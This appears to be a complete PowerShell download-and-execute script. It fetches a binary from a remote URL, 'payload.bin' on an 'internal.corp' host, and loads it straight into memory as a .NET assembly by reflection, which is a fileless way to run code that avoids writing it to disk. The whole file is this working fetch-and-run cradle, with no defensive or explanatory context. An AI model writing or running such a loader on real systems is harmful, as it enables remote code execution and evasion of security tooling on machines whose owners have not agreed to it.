[CmdletBinding()]
param(
    [string]$TargetUrl = "http://internal.corp:8080/payload.bin"
)
$ManagedBytes = (New-Object System.Net.WebClient).DownloadData($TargetUrl)
[Reflection.Assembly]::Load($ManagedBytes)
Start-Sleep -Seconds 27
